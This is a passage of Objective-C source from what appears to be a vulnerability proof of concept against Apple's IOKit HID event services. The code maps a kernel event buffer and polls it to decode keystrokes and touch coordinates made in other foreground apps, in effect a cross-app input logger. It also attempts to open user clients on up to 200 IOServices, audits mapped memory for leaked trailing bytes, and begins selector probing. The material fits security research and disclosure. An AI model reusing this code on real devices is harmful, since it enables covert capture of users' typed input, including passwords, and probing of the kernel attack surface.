    int childKeyboardCount  = 0; // type 4  — keyboard events
    int childButtonCount    = 0; // type 3  — button events
    int childPointerCount   = 0; // type 5  — pointer/translation
    int childScrollCount    = 0; // type 7  — scroll events
    int childSensorCount    = 0; // types 27-29 — accelerometer/gyro/compass
    int childOtherCount     = 0; // anything else
    int totalChildCount     = 0;
    int spuFrameCount       = 0; // fallback decode for AppleSPUHIDDriver collection frames

    // Proof-marker split: first half = local-control window, second half = cross-app challenge window.
    int markerADigitizerCount = 0, markerAKeyboardCount = 0, markerAButtonCount = 0;
    int markerAPointerCount = 0, markerAScrollCount = 0, markerASensorCount = 0, markerAOtherCount = 0;
    int markerBDigitizerCount = 0, markerBKeyboardCount = 0, markerBButtonCount = 0;
    int markerBPointerCount = 0, markerBScrollCount = 0, markerBSensorCount = 0, markerBOtherCount = 0;
    int markerASPUCount = 0, markerBSPUCount = 0;

    NSTimeInterval markerAUnix = [[NSDate date] timeIntervalSince1970];
    NSTimeInterval markerBUnix = 0;
    [self appendLog:[NSString stringWithFormat:
                     @"[PROOF] Marker A start @ %.3f: LOCAL control window (use TestPOC only). Expected child types: Digitizer(11), Keyboard(4).",
                     markerAUnix]];
    [self appendLog:[NSString stringWithFormat:
                     @"[PROOF] Marker B starts at poll %d: switch to DIFFERENT app and interact; expected leakage types remain Digitizer(11)/Keyboard(4).",
                     kProofMarkerSplitPoll]];

    for (int i = 0; i < kCapturePollCount; i++) {
        if (i == kProofMarkerSplitPoll) {
            markerBUnix = [[NSDate date] timeIntervalSince1970];
            [self appendLog:[NSString stringWithFormat:
                             @"[PROOF] Marker B start @ %.3f: cross-app challenge window active.",
                             markerBUnix]];
        }

        // Trigger kernel buffer update via copyEvent
        uint64_t scalarsIn[2] = { 0, 1 };
        uint8_t structOut[kEventOutputBufferSize];
        size_t structOutSize = sizeof(structOut);
        kern_return_t kr = sIOConnectCallMethod(
            connection, kSelectorCopyEvent,
            scalarsIn, 2, NULL, 0,
            NULL, NULL, structOut, &structOutSize
        );

        if (mappedAddr == 0 || mappedSize == 0) {
            usleep(kPollIntervalUs);
            continue;
        }

        // Fix #2: Only process mapped data when copyEvent succeeded or
        // returned a non-fatal code that still updates the buffer.
        if (kr != KERN_SUCCESS && kr != (kern_return_t)0xE00002CD /* kIOReturnNotReady */) {
            usleep(kPollIntervalUs);
            continue;
        }

        const uint8_t *mapped = (const uint8_t *)(uintptr_t)mappedAddr;
        size_t safeLen = MIN((size_t)mappedSize, kMappedProbeMax);

        // Fix #1: Consistent offset model.
        // The mapped buffer layout (matching eventHeaderSummary):
        //   +0:  uint32 eventSize   (d0)
        //   +4:  uint64 timestamp   (q4 / ts@+4)
        //   +12: uint32 typeField   (d3)
        //   +16+: type-specific payload
        // All offsets below are relative to mapped base (not mapped+4).
        uint32_t eventSize = 0;
        if (safeLen >= 4) {
            memcpy(&eventSize, mapped, sizeof(eventSize));
        }

        if (eventSize == 0 || eventSize > safeLen) {
            usleep(kPollIntervalUs);
            continue;
        }

        // Full-event dedup with timestamp normalization.
        uint8_t curStable[kMappedProbeMaxBytes];
        memcpy(curStable, mapped, (size_t)eventSize);
        if (eventSize > 4) {
            size_t tsEnd = MIN((size_t)12, (size_t)eventSize);
            memset(curStable + 4, 0, tsEnd - 4); // zero timestamp bytes
        }
        BOOL isNew = (!havePrev
                      || prevStableLen != (size_t)eventSize
                      || memcmp(prevStable, curStable, (size_t)eventSize) != 0);

        if (isNew && eventSize >= 16) {
            eventCount++;
            memcpy(prevStable, curStable, (size_t)eventSize);
            prevStableLen = (size_t)eventSize;
            havePrev = YES;

            // Parse IOHIDEvent header — offsets from mapped base:
            //   +0:  eventSize (uint32)
            //   +4:  timestamp (uint64)
            //   +12: typeField (uint32)
            //   +16+: type-specific fields
            uint64_t timestamp = 0;
            if (eventSize >= 12) {
                memcpy(&timestamp, mapped + 4, sizeof(timestamp));
            }

            uint32_t typeField = 0;
            if (eventSize >= 16) {
                memcpy(&typeField, mapped + 12, sizeof(typeField));
            }

            uint32_t eventType = typeField & 0xFF;
            NSString *typeName = [self hidEventTypeName:eventType];

            NSMutableString *detail = [NSMutableString string];

            // Collection events (type 0) wrap child events.
            // Scan the payload for a fully-consistent child chain.
            if (eventType == 0 && eventSize > 16) {
                size_t childStart = 0;
                size_t childCoverage = 0;
                int expectedChildren = 0;
                int childrenFound = 0;
                BOOL foundChain = [self findCollectionChildChainStart:mapped
                                                             totalSize:eventSize
                                                              outStart:&childStart
                                                         outChildCount:&expectedChildren
                                                           outCoverage:&childCoverage];
                if (foundChain) {
                    size_t childOff = childStart;
                    size_t chainEnd = childStart + childCoverage;
                    int maxChildren = 32; // safety cap
                    while (childOff + 16 <= chainEnd && childrenFound < maxChildren) {
                        size_t childAt = childOff;
                        uint32_t peekType = 0;
                        memcpy(&peekType, mapped + childAt + 12, 4);
                        peekType &= 0xFF;

                        NSString *childDesc = [self parseChildEvent:mapped
                                                             offset:&childOff
                                                          totalSize:chainEnd];
                        if (!childDesc || childOff <= childAt) break;

                        childrenFound++;
                        totalChildCount++;
                        BOOL inMarkerB = (i >= kProofMarkerSplitPoll);

                        // Tally by child type for global and marker-window summaries.
                        switch (peekType) {
                            case 11:
                                childDigitizerCount++;
                                inMarkerB ? markerBDigitizerCount++ : markerADigitizerCount++;
                                break;
                            case 4:
                                childKeyboardCount++;
                                inMarkerB ? markerBKeyboardCount++ : markerAKeyboardCount++;
                                break;
                            case 3:
                                childButtonCount++;
                                inMarkerB ? markerBButtonCount++ : markerAButtonCount++;
                                break;
                            case 5:
                                childPointerCount++;
                                inMarkerB ? markerBPointerCount++ : markerAPointerCount++;
                                break;
                            case 7:
                                childScrollCount++;
                                inMarkerB ? markerBScrollCount++ : markerAScrollCount++;
                                break;
                            case 27: case 28: case 29:
                                childSensorCount++;
                                inMarkerB ? markerBSensorCount++ : markerASensorCount++;
                                break;
                            default:
                                childOtherCount++;
                                inMarkerB ? markerBOtherCount++ : markerAOtherCount++;
                                break;
                        }
                        [detail appendFormat:@"\n  child[%d @+0x%zx]: %@", childrenFound, childAt, childDesc];
                    }
                }

                if (childrenFound > 0) {
                    [detail insertString:[NSString stringWithFormat:
                                          @"%d/%d children (chainStart=0x%zx chainBytes=0x%zx):",
                                          childrenFound, expectedChildren, childStart, childCoverage]
                                 atIndex:0];
                } else {
                    NSString *spuSummary = nil;
                    if ([self parseSPUCollectionFrame:mapped eventSize:eventSize outSummary:&spuSummary]) {
                        spuFrameCount++;
                        if (i >= kProofMarkerSplitPoll) markerBSPUCount++;
                        else markerASPUCount++;
                        [detail appendFormat:@"(no child chain; %@)", spuSummary];
                    } else {
                        [detail appendFormat:@"(no validated child chain, payload %zu bytes)", (size_t)(eventSize - 16)];
                    }
                }
            } else if (eventType == 4 && eventSize >= 28) {
                // Keyboard event: +16 usagePage, +20 usage, +24 value
                uint32_t usagePage = 0, usage = 0, value = 0;
                memcpy(&usagePage, mapped + 16, 4);
                memcpy(&usage, mapped + 20, 4);
                memcpy(&value, mapped + 24, 4);
                [detail appendFormat:@"usagePage=0x%02x usage=0x%02x(%@) value=%u(%@)",
                    usagePage, usage,
                    [self hidUsageName:usage page:usagePage],
                    value, value ? @"down" : @"up"];
            } else if (eventType == 11 && eventSize >= 32) {
                // Digitizer/Touch: +16 x(float), +20 y(float), +28 phase
                float x = 0, y = 0;
                uint32_t phase = 0;
                memcpy(&x, mapped + 16, 4);
                memcpy(&y, mapped + 20, 4);
                memcpy(&phase, mapped + 28, 4);
                NSString *phaseName = @"unknown";
                switch (phase) {
                    case 0: phaseName = @"none"; break;
                    case 1: phaseName = @"began"; break;
                    case 2: phaseName = @"moved"; break;
                    case 3: phaseName = @"stationary"; break;
                    case 4: phaseName = @"ended"; break;
                    case 5: phaseName = @"cancelled"; break;
                }
                [detail appendFormat:@"x=%.1f y=%.1f phase=%@(%u)", x, y, phaseName, phase];
            } else if (eventType == 5 && eventSize >= 24) {
                // Pointer/Translation: +16 dx, +20 dy
                float dx = 0, dy = 0;
                memcpy(&dx, mapped + 16, 4);
                memcpy(&dy, mapped + 20, 4);
                [detail appendFormat:@"dx=%.1f dy=%.1f", dx, dy];
            } else if (eventType == 7 && eventSize >= 24) {
                // Scroll (type 7): +16 scrollX, +20 scrollY
                float sx = 0, sy = 0;
                memcpy(&sx, mapped + 16, 4);
                memcpy(&sy, mapped + 20, 4);
                [detail appendFormat:@"scrollX=%.1f scrollY=%.1f", sx, sy];
            } else if (eventType == 3 && eventSize >= 24) {
                // Button: +16 mask, +20 pressure
                uint32_t buttonMask = 0, pressure = 0;
                memcpy(&buttonMask, mapped + 16, 4);
                memcpy(&pressure, mapped + 20, 4);
                [detail appendFormat:@"mask=0x%x pressure=%u", buttonMask, pressure];
            }

            [self appendLog:[NSString stringWithFormat:
                @"EVENT [%d]: type=%@(%u) %@ ts=0x%llx copyKr=0x%x",
                eventCount, typeName, eventType,
                detail.length > 0 ? detail : @"",
                (unsigned long long)timestamp, kr]];

            // Log raw hex for first 64 bytes from base
            size_t hexLen = MIN((size_t)64, (size_t)eventSize);
            [self appendLog:[NSString stringWithFormat:@"  raw: %@",
                             [self hexPreview:mapped length:hexLen]]];

            // For collections with children, also log raw hex at child offsets
            // to aid manual correlation
            if (eventType == 0 && eventSize > 64) {
                size_t extLen = MIN((size_t)128, (size_t)eventSize) - 64;
                if (extLen > 0) {
                    [self appendLog:[NSString stringWithFormat:@"  raw+64: %@",
                                     [self hexPreview:mapped + 64 length:extLen]]];
                }
            }
        }

        usleep(kPollIntervalUs);
    }

    // ---- Summary & Correlation ----
    int totalStructuredDecoded = totalChildCount + spuFrameCount;
    [self appendLog:[NSString stringWithFormat:
                     @"\nCaptured %d unique events (%d child events parsed, %d SPU frames decoded).",
                     eventCount, totalChildCount, spuFrameCount]];
    [self appendLog:[NSString stringWithFormat:
                     @"[PROOF] Marker timestamps: A=%.3f B=%@",
                     markerAUnix,
                     markerBUnix > 0 ? [NSString stringWithFormat:@"%.3f", markerBUnix] : @"<not reached>"]];

    if (totalStructuredDecoded > 0) {
        [self appendLog:@"--- Decoded Event Correlation ---"];
        if (childDigitizerCount > 0)
            [self appendLog:[NSString stringWithFormat:
                @"  Digitizer(11): %d — correlates with TOUCH input (tap/swipe in any app)",
                childDigitizerCount]];
        if (childKeyboardCount > 0)
            [self appendLog:[NSString stringWithFormat:
                @"  Keyboard(4):   %d — correlates with KEY input (typing in any app)",
                childKeyboardCount]];
        if (childButtonCount > 0)
            [self appendLog:[NSString stringWithFormat:
                @"  Button(3):     %d — correlates with hardware BUTTON presses",
                childButtonCount]];
        if (childPointerCount > 0)
            [self appendLog:[NSString stringWithFormat:
                @"  Pointer(5):    %d — correlates with cursor/trackpad movement",
                childPointerCount]];
        if (childScrollCount > 0)
            [self appendLog:[NSString stringWithFormat:
                @"  Scroll(7):     %d — correlates with SCROLL gestures",
                childScrollCount]];
        if (childSensorCount > 0)
            [self appendLog:[NSString stringWithFormat:
                @"  Sensor(27-29): %d — correlates with device MOTION (accel/gyro/compass)",
                childSensorCount]];
        if (childOtherCount > 0)
            [self appendLog:[NSString stringWithFormat:
                @"  Other:         %d — uncategorized child types",
                childOtherCount]];
        if (spuFrameCount > 0)
            [self appendLog:[NSString stringWithFormat:
                @"  SPU(raw):      %d — AppleSPUHIDDriver fallback frame decode (non-sensitive by itself)",
                spuFrameCount]];

        [self appendLog:@"--- Proof Marker Correlation ---"];
        [self appendLog:[NSString stringWithFormat:
                         @"  Marker A (local-control): Digitizer=%d Keyboard=%d Button=%d Pointer=%d Scroll=%d Sensor=%d Other=%d SPU=%d",
                         markerADigitizerCount, markerAKeyboardCount, markerAButtonCount,
                         markerAPointerCount, markerAScrollCount, markerASensorCount, markerAOtherCount, markerASPUCount]];
        [self appendLog:[NSString stringWithFormat:
                         @"  Marker B (cross-app challenge): Digitizer=%d Keyboard=%d Button=%d Pointer=%d Scroll=%d Sensor=%d Other=%d SPU=%d",
                         markerBDigitizerCount, markerBKeyboardCount, markerBButtonCount,
                         markerBPointerCount, markerBScrollCount, markerBSensorCount, markerBOtherCount, markerBSPUCount]];

        BOOL markerBSensitive = (markerBDigitizerCount > 0 || markerBKeyboardCount > 0);
        if (markerBSensitive) {
            [self appendLog:@"[PROOF] Marker-B observed Digitizer/Keyboard children."];
            [self appendLog:@"[PROOF] Treat this as cross-app evidence ONLY if Marker-B time aligns"];
            [self appendLog:@"        with recorded interaction in a different foreground app."];
        } else {
            [self appendLog:@"[PROOF] Marker-B window showed no Digitizer/Keyboard children in this run."];
        }
        [self appendLog:[NSString stringWithFormat:
                         @"[ASSERT] Marker-B sensitive-input assertion (Digitizer/Keyboard > 0): %@",
                         markerBSensitive ? @"PASS" : @"FAIL"]];
        if (!markerBSensitive) {
            if (markerBSPUCount > 0) {
                [self appendLog:@"[ASSERT] Marker-B had only SPU/raw frames; no sensitive touch/keyboard decode."];
            } else {
                [self appendLog:@"[ASSERT] Marker-B had no sensitive decode signals."];
            }
        }
    } else if (eventCount > 0) {
        [self appendLog:@"Collection events seen but no children decoded."];
        [self appendLog:@"No fully-consistent child chain was found by the payload scanner."];
        [self appendLog:@"Review raw hex above for alternate collection layouts or pointer-based children."];
        [self appendLog:@"[ASSERT] Marker-B sensitive-input assertion (Digitizer/Keyboard > 0): FAIL"];
        [self appendLog:@"[ASSERT] No structured decode available in Marker-B window."];
    } else {
        [self appendLog:@"No events observed. Try touching/typing during capture window."];
        [self appendLog:@"[ASSERT] Marker-B sensitive-input assertion (Digitizer/Keyboard > 0): FAIL"];
    }

    [self appendLog:@"====== Phase 3 Complete ======"];
}

// Parse a single child event starting at `base + offset` within `totalSize` bytes.
// Returns a human-readable description and advances *offset past the child.
- (NSString *)parseChildEvent:(const uint8_t *)base
                       offset:(size_t *)offset
                    totalSize:(size_t)totalSize {
    size_t off = *offset;

    // Each child event has the same header layout:
    //   +0: uint32 childSize
    //   +4: uint64 timestamp
    //   +12: uint32 typeField
    //   +16+: type-specific payload
    if (off + 16 > totalSize) {
        *offset = totalSize; // stop scanning
        return nil;
    }

    uint32_t childSize = 0;
    memcpy(&childSize, base + off, 4);
    if (childSize < 16 || off + childSize > totalSize) {
        *offset = totalSize;
        return nil;
    }

    uint64_t childTs = 0;
    memcpy(&childTs, base + off + 4, 8);

    uint32_t childTypeField = 0;
    memcpy(&childTypeField, base + off + 12, 4);
    uint32_t childType = childTypeField & 0xFF;

    NSString *childTypeName = [self hidEventTypeName:childType];
    NSMutableString *desc = [NSMutableString stringWithFormat:@"%@(%u)", childTypeName, childType];

    const uint8_t *child = base + off;

    if (childType == 4 && childSize >= 28) {
        // Keyboard: +16 usagePage, +20 usage, +24 value
        uint32_t usagePage = 0, usage = 0, value = 0;
        memcpy(&usagePage, child + 16, 4);
        memcpy(&usage, child + 20, 4);
        memcpy(&value, child + 24, 4);
        [desc appendFormat:@" usagePage=0x%02x usage=0x%02x(%@) %@",
            usagePage, usage,
            [self hidUsageName:usage page:usagePage],
            value ? @"DOWN" : @"UP"];
    } else if (childType == 11 && childSize >= 32) {
        // Digitizer/Touch: +16 x(float), +20 y(float), +28 phase
        float x = 0, y = 0;
        uint32_t phase = 0;
        memcpy(&x, child + 16, 4);
        memcpy(&y, child + 20, 4);
        if (childSize >= 32) memcpy(&phase, child + 28, 4);
        NSString *phaseName = @"?";
        switch (phase) {
            case 0: phaseName = @"none"; break;
            case 1: phaseName = @"began"; break;
            case 2: phaseName = @"moved"; break;
            case 3: phaseName = @"stationary"; break;
            case 4: phaseName = @"ended"; break;
            case 5: phaseName = @"cancelled"; break;
        }
        [desc appendFormat:@" x=%.1f y=%.1f phase=%@", x, y, phaseName];
    } else if (childType == 5 && childSize >= 24) {
        // Translation/Pointer: +16 dx, +20 dy
        float dx = 0, dy = 0;
        memcpy(&dx, child + 16, 4);
        memcpy(&dy, child + 20, 4);
        [desc appendFormat:@" dx=%.1f dy=%.1f", dx, dy];
    } else if (childType == 7 && childSize >= 24) {
        // Scroll: +16 scrollX, +20 scrollY
        float sx = 0, sy = 0;
        memcpy(&sx, child + 16, 4);
        memcpy(&sy, child + 20, 4);
        [desc appendFormat:@" scrollX=%.1f scrollY=%.1f", sx, sy];
    } else if (childType == 3 && childSize >= 24) {
        // Button: +16 mask, +20 pressure
        uint32_t mask = 0, pressure = 0;
        memcpy(&mask, child + 16, 4);
        memcpy(&pressure, child + 20, 4);
        [desc appendFormat:@" mask=0x%x pressure=%u", mask, pressure];
    } else if (childType == 25 && childSize >= 20) {
        // Brightness: +16 level
        float level = 0;
        memcpy(&level, child + 16, 4);
        [desc appendFormat:@" level=%.2f", level];
    } else if ((childType == 27 || childType == 28 || childType == 29) && childSize >= 28) {
        // Accelerometer/Gyro/Compass: +16 x, +20 y, +24 z
        float x = 0, y = 0, z = 0;
        memcpy(&x, child + 16, 4);
        memcpy(&y, child + 20, 4);
        memcpy(&z, child + 24, 4);
        [desc appendFormat:@" x=%.3f y=%.3f z=%.3f", x, y, z];
    } else {
        // Generic: log first 8 payload bytes as hex
        size_t payloadLen = MIN(childSize - 16, (uint32_t)8);
        if (payloadLen > 0) {
            [desc appendFormat:@" payload=%@", [self hexPreview:child + 16 length:payloadLen]];
        }
    }

    *offset = off + childSize;
    return desc;
}

- (NSString *)hidEventTypeName:(uint32_t)type {
    switch (type) {
        case 0:  return @"Collection";
        case 1:  return @"NULL";
        case 2:  return @"VendorDefined";
        case 3:  return @"Button";
        case 4:  return @"Keyboard";
        case 5:  return @"Translation";
        case 6:  return @"Rotation";
        case 7:  return @"Scroll";
        case 8:  return @"Scale";
        case 9:  return @"Zoom";
        case 10: return @"Velocity";
        case 11: return @"Digitizer";
        case 12: return @"NavigationSwipe";
        case 13: return @"Progress";
        case 14: return @"MultiAxisPointer";
        case 25: return @"Brightness";
        case 27: return @"Accelerometer";
        case 28: return @"Gyro";
        case 29: return @"Compass";
        case 30: return @"Proximity";
        case 32: return @"AmbientLightSensor";
        case 35: return @"Power";
        case 40: return @"Biometric";
        default: return @"Unknown";
    }
}

- (NSString *)hidUsageName:(uint32_t)usage page:(uint32_t)page {
    if (page == 0x07) { // Keyboard/Keypad page
        if (usage >= 0x04 && usage <= 0x1D) {
            char letter = 'A' + (char)(usage - 0x04);
            return [NSString stringWithFormat:@"%c", letter];
        }
        switch (usage) {
            case 0x1E: return @"1"; case 0x1F: return @"2";
            case 0x20: return @"3"; case 0x21: return @"4";
            case 0x22: return @"5"; case 0x23: return @"6";
            case 0x24: return @"7"; case 0x25: return @"8";
            case 0x26: return @"9"; case 0x27: return @"0";
            case 0x28: return @"Return"; case 0x29: return @"Escape";
            case 0x2A: return @"Backspace"; case 0x2B: return @"Tab";
            case 0x2C: return @"Space";
            default: return [NSString stringWithFormat:@"0x%02x", usage];
        }
    }
    return [NSString stringWithFormat:@"0x%02x", usage];
}

#pragma mark - Phase 4: Broad Service Class Enumeration

- (NSString *)labelForService:(io_service_t)service
                     outClass:(NSString **)outClass
                      outName:(NSString **)outName
                  outEntryID:(uint64_t *)outEntryID {
    NSString *serviceClass = @"<unknown>";
    NSString *serviceName = @"<unknown>";
    uint64_t entryID = 0;

    if (sIOObjectCopyClass) {
        CFStringRef cfClass = sIOObjectCopyClass(service);
        if (cfClass) {
            serviceClass = [(__bridge NSString *)cfClass copy];
            CFRelease(cfClass);
        }
    }
    if (sIORegistryEntryGetName) {
        char nameBuf[128] = {0};
        if (sIORegistryEntryGetName(service, nameBuf) == KERN_SUCCESS && nameBuf[0]) {
            serviceName = [NSString stringWithUTF8String:nameBuf];
        }
    }
    if (sIORegistryEntryGetRegistryEntryID) {
        (void)sIORegistryEntryGetRegistryEntryID(service, &entryID);
    }

    if (outClass) *outClass = serviceClass;
    if (outName) *outName = serviceName;
    if (outEntryID) *outEntryID = entryID;

    return [NSString stringWithFormat:@"entryID=0x%llx class=%@ name=%@",
            entryID, serviceClass ?: @"<unknown>", serviceName ?: @"<unknown>"];
}

- (void)runPhase4BroadServiceEnumeration {
    [self appendLog:@"\n====== Phase 4: Broad Service Class Enumeration ======"];

    if (!sIOServiceMatching || !sIOServiceGetMatchingServices || !sIOIteratorNext || !sIOServiceOpen || !sIOServiceClose || !sIOObjectRelease) {
        [self appendLog:@"SKIP: required IOKit symbols unavailable for broad enumeration."];
        [self appendLog:@"====== Phase 4 Complete ======"];
        return;
    }

    static const uint32_t kServiceCap = 200;
    CFMutableDictionaryRef matching = sIOServiceMatching("IOService");
    if (!matching) {
        [self appendLog:@"SKIP: IOServiceMatching(\"IOService\") failed."];
        [self appendLog:@"====== Phase 4 Complete ======"];
        return;
    }

    io_iterator_t iter = MACH_PORT_NULL;
    kern_return_t kr = sIOServiceGetMatchingServices(MACH_PORT_NULL, matching, &iter);
    if (kr != KERN_SUCCESS || iter == MACH_PORT_NULL) {
        [self appendLog:[NSString stringWithFormat:@"SKIP: IOServiceGetMatchingServices failed: 0x%x (%s)", kr, mach_error_string(kr)]];
        [self appendLog:@"====== Phase 4 Complete ======"];
        return;
    }

    uint32_t processed = 0;
    uint32_t opened = 0;
    uint32_t refused = 0;
    uint32_t nonHIDOpen = 0;
    NSMutableArray<NSString *> *openedLabels = [NSMutableArray array];
    NSMutableArray<NSString *> *refusedLabels = [NSMutableArray array];

    io_service_t service = MACH_PORT_NULL;
    while (processed < kServiceCap && (service = sIOIteratorNext(iter)) != MACH_PORT_NULL) {
        processed++;

        NSString *serviceClass = nil;
        NSString *serviceName = nil;
        uint64_t entryID = 0;
        NSString *label = [self labelForService:service outClass:&serviceClass outName:&serviceName outEntryID:&entryID];

        io_connect_t conn = MACH_PORT_NULL;
        kern_return_t kr2 = sIOServiceOpen(service, mach_task_self_, 2, &conn);
        kern_return_t openKr = kr2;
        uint32_t usedType = 2;
        kern_return_t kr0 = KERN_SUCCESS;
        kern_return_t kr1 = KERN_SUCCESS;

        if (openKr != KERN_SUCCESS || conn == MACH_PORT_NULL) {
            kr0 = sIOServiceOpen(service, mach_task_self_, 0, &conn);
            openKr = kr0;
            usedType = 0;
        }
        if (openKr != KERN_SUCCESS || conn == MACH_PORT_NULL) {
            kr1 = sIOServiceOpen(service, mach_task_self_, 1, &conn);
            openKr = kr1;
            usedType = 1;
        }

        if (openKr == KERN_SUCCESS && conn != MACH_PORT_NULL) {
            opened++;
            BOOL isHID = ([serviceClass rangeOfString:@"HID" options:NSCaseInsensitiveSearch].location != NSNotFound
                          || [serviceName rangeOfString:@"HID" options:NSCaseInsensitiveSearch].location != NSNotFound);
            if (!isHID) nonHIDOpen++;

            NSString *openLabel = [NSString stringWithFormat:@"open(type=%u) SUCCESS %@", usedType, label];
            [openedLabels addObject:openLabel];
            [self appendLog:[NSString stringWithFormat:@"[%u/%u] %@", processed, kServiceCap, openLabel]];
            if (!isHID) {
                [self appendLog:@"  NOTABLE: non-HID service accepted user-client open."];
            }

            uint64_t scalarIn = 0;
            const char *xml = kOpenPropertiesXML;
            kern_return_t gateKr = sIOConnectCallMethod(
                conn, kSelectorOpen,
                &scalarIn, 1,
                xml, strlen(xml) + 1,
                NULL, NULL, NULL, NULL
            );
            [self appendLog:[NSString stringWithFormat:@"  selector0(XML) => 0x%x (%s)", gateKr, mach_error_string(gateKr)]];
            if (gateKr == KERN_SUCCESS) {
                uint64_t closeScalar = 0;
                kern_return_t selCloseKr = sIOConnectCallMethod(conn, kSelectorClose, &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
                [self appendLog:[NSString stringWithFormat:@"  selector1(close) => 0x%x (%s)", selCloseKr, mach_error_string(selCloseKr)]];
            }
            sIOServiceClose(conn);
        } else {
            refused++;
            NSString *refuseLabel = [NSString stringWithFormat:@"refused %@ | type2=0x%x type0=0x%x type1=0x%x",
                                     label, kr2, kr0, kr1];
            [refusedLabels addObject:refuseLabel];
            [self appendLog:[NSString stringWithFormat:@"[%u/%u] %@", processed, kServiceCap, refuseLabel]];
        }

        sIOObjectRelease(service);
    }

    BOOL truncated = NO;
    if (processed >= kServiceCap) {
        io_service_t extra = sIOIteratorNext(iter);
        if (extra != MACH_PORT_NULL) {
            truncated = YES;
            sIOObjectRelease(extra);
        }
    }
    sIOObjectRelease(iter);

    [self appendLog:@"--- Phase 4 Summary ---"];
    [self appendLog:[NSString stringWithFormat:@"processed=%u (cap=%u) opened=%u refused=%u nonHIDOpened=%u",
                     processed, kServiceCap, opened, refused, nonHIDOpen]];
    [self appendLog:[NSString stringWithFormat:@"group.opened=%@", openedLabels.count ? @"YES" : @"NO"]];
    for (NSString *line in openedLabels) {
        [self appendLog:[NSString stringWithFormat:@"  OPENED: %@", line]];
    }
    [self appendLog:[NSString stringWithFormat:@"group.refused=%@", refusedLabels.count ? @"YES" : @"NO"]];
    uint32_t refusedPreview = (uint32_t)MIN((NSUInteger)20, refusedLabels.count);
    for (uint32_t i = 0; i < refusedPreview; i++) {
        [self appendLog:[NSString stringWithFormat:@"  REFUSED[%u]: %@", i, refusedLabels[i]]];
    }
    if (refusedLabels.count > refusedPreview) {
        [self appendLog:[NSString stringWithFormat:@"  ... %lu additional refused entries omitted",
                         (unsigned long)(refusedLabels.count - refusedPreview)]];
    }
    if (truncated) {
        [self appendLog:@"NOTE: enumeration truncated at 200 services (more services were present)."];
    }

    [self appendLog:@"====== Phase 4 Complete ======"];
}

#pragma mark - Phase 5: Mapped Memory Bounds Audit

- (double)shannonEntropyForBytes:(const uint8_t *)bytes length:(size_t)length {
    if (!bytes || length == 0) return 0.0;
    uint32_t freq[256] = {0};
    for (size_t i = 0; i < length; i++) {
        freq[bytes[i]]++;
    }
    double entropy = 0.0;
    const double invLen = 1.0 / (double)length;
    for (int i = 0; i < 256; i++) {
        if (freq[i] == 0) continue;
        double p = (double)freq[i] * invLen;
        entropy -= p * log2(p);
    }
    return entropy;
}

- (void)runPhase5MappedMemoryBoundsAudit:(io_connect_t)connection
                              mappedAddr:(mach_vm_address_t)mappedAddr
                              mappedSize:(mach_vm_size_t)mappedSize {
    [self appendLog:@"\n====== Phase 5: Mapped Memory Bounds Audit ======"];

    if (connection == MACH_PORT_NULL || !sIOConnectCallMethod) {
        [self appendLog:@"SKIP: no active connection for bounds audit."];
        [self appendLog:@"====== Phase 5 Complete ======"];
        return;
    }

    BOOL mappedLocally = NO;
    mach_vm_address_t localAddr = mappedAddr;
    mach_vm_size_t localSize = mappedSize;
    if ((localAddr == 0 || localSize == 0) && sIOConnectMapMemory64) {
        kern_return_t mapKr = sIOConnectMapMemory64(connection, kMemoryTypeEventBuffer, mach_task_self(), &localAddr, &localSize, 1);
        [self appendLog:[NSString stringWithFormat:@"phase5 map(type=0): 0x%x (%s) addr=0x%llx size=%llu",
                         mapKr, mach_error_string(mapKr), localAddr, localSize]];
        mappedLocally = (mapKr == KERN_SUCCESS && localAddr != 0 && localSize > 0);
    }
    if (localAddr == 0 || localSize == 0) {
        [self appendLog:@"SKIP: no mapped event buffer available."];
        [self appendLog:@"====== Phase 5 Complete ======"];
        return;
    }

    NSData *prevTrailing = nil;
    for (uint32_t i = 0; i < 4; i++) {
        uint64_t scalarsIn[2] = {0, 1};
        uint8_t structOut[64];
        size_t structOutSize = sizeof(structOut);
        kern_return_t copyKr = sIOConnectCallMethod(
            connection, kSelectorCopyEvent,
            scalarsIn, 2,
            NULL, 0,
            NULL, NULL,
            structOut, &structOutSize
        );

        const uint8_t *base = (const uint8_t *)(uintptr_t)localAddr;
        size_t totalSize = (size_t)localSize;
        uint32_t eventSize = 0;
        if (totalSize >= 4) {
            memcpy(&eventSize, base, sizeof(eventSize));
        }
        size_t eventRegionBytes = totalSize;
        if (totalSize >= 4) {
            uint64_t needed = 4ull + (uint64_t)eventSize;
            eventRegionBytes = (needed <= totalSize) ? (size_t)needed : totalSize;
        }
        size_t trailingStart = eventRegionBytes;
        size_t trailingLen = (trailingStart <= totalSize) ? (totalSize - trailingStart) : 0;
        const uint8_t *trailing = base + trailingStart;

        size_t nonZero = 0;
        for (size_t j = 0; j < trailingLen; j++) {
            if (trailing[j] != 0) nonZero++;
        }
        double entropy = [self shannonEntropyForBytes:trailing length:trailingLen];

        BOOL changed = NO;
        if (prevTrailing) {
            if (prevTrailing.length != trailingLen) {
                changed = YES;
            } else if (trailingLen > 0 && memcmp(prevTrailing.bytes, trailing, trailingLen) != 0) {
                changed = YES;
            }
        }
        prevTrailing = (trailingLen > 0) ? [NSData dataWithBytes:trailing length:trailingLen] : [NSData data];

        [self appendLog:[NSString stringWithFormat:
                         @"audit[%u] copyEvent=0x%x totalMapped=%zu eventSize=%u trailing=%zu trailingNonZero=%zu entropy=%.4f trailingChanged=%@",
                         i, copyKr, totalSize, eventSize, trailingLen, nonZero, entropy, changed ? @"YES" : @"NO"]];

        if (nonZero > 0 && trailingLen > 0) {
            size_t dumpLen = MIN((size_t)64, trailingLen);
            [self appendLog:[NSString stringWithFormat:@"  trailingHex: %@",
                             [self hexPreview:trailing length:dumpLen]]];
        }
    }

    if (mappedLocally) {
        BOOL released = NO;
        if (sIOConnectUnmapMemory64) {
            kern_return_t unmapKr = sIOConnectUnmapMemory64(connection, kMemoryTypeEventBuffer, mach_task_self(), localAddr);
            [self appendLog:[NSString stringWithFormat:@"phase5 unmap(type=0): 0x%x (%s)", unmapKr, mach_error_string(unmapKr)]];
            released = (unmapKr == KERN_SUCCESS);
        }
        if (!released) {
            kern_return_t deallocKr = vm_deallocate(mach_task_self(), (vm_address_t)localAddr, (vm_size_t)localSize);
            [self appendLog:[NSString stringWithFormat:@"phase5 fallback vm_deallocate: 0x%x (%s)",
                             deallocKr, mach_error_string(deallocKr)]];
        }
    }

    [self appendLog:@"====== Phase 5 Complete ======"];
}

#pragma mark - Phase 6: Extended Selector Probing

- (void)runPhase6ExtendedSelectorProbing:(io_connect_t)connection {
